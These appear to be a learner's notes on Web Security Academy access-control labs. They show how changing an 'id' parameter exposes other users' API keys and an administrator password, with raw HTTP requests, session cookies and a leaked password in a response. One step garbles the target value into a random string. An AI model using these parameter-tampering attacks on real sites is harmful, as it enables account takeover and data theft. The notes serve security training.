## Method-based access control can be circumvented

Role - user to Admin 

try to change session id 
try to change the role auth user

## User ID controlled by request parameter 

    Log in using the supplied credentials and go to your account page.
    Note that the URL contains your username in the "id" parameter.
    Send the request to Burp Repeater.
    Change the "id" parameter to carUJN3KbEXHEFIiHOFRXRKivKK4My6UzVP
    Retrieve and submit the API key for carlos.

https://0a6100f503b07ade81174ece00eb00f6.web-security-academy.net/my-account?id=wiener #original
https://0a6100f503b07ade81174ece00eb00f6.web-security-academy.net/my-account?id=carlos #modified

## User ID controlled by request parameter with data leakage in redirect

        Log in using the supplied credentials and access your account page.
        Send the request to Burp Repeater.
        Change the "id" parameter to carlos.
        Observe that although the response is now redirecting you to the home page, it has a body containing the API key belonging to carlos.
        Submit the API key.

GET /my-account?id=wiener HTTP/2
Host: 0a8c006c03cdb2f18030fd6b00f50049.web-security-academy.net
Cookie: session=hfNIY8kqlS5AlBKz0wiUJ12yllzFHUrl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8c006c03cdb2f18030fd6b00f50049.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

***
GET /my-account?id=carlos HTTP/2
Host: 0a8c006c03cdb2f18030fd6b00f50049.web-security-academy.net
Cookie: session=hfNIY8kqlS5AlBKz0wiUJ12yllzFHUrl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8c006c03cdb2f18030fd6b00f50049.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

## User ID controlled by request parameter with password disclosure
   

    Log in using the supplied credentials and access the user account page.
    Change the "id" parameter in the URL to administrator.
    View the response in Burp and observe that it contains the administrator's password.
    Log in to the administrator account and delete carlos.

        GET /my-account?id=administrator HTTP/2
        Host: 0a79000803c4b2d081a62f5500830070.web-security-academy.net
        Cookie: session=M6yNsRWz9765PhgqA19zc3e4DzOkLce6
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/   128.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/ webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a79000803c4b2d081a62f5500830070.web-security-academy.net/
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
--------------------------------------------------------------------------------
        <form class="login-form" action="/my-account/change-password" method="POST">
        <br/>
        <label>Password</label>
        <input required type="hidden" name="csrf" value="rb8vndWuskRD8oAzI6EgChUo3GwrgeKS">
        <input required type=password name=password value='udbaiqjv8rnydl9k8ym9'/> ## password dislcouse
        <button class='button' type='submit'> Update password </button>
        </form>
        </div>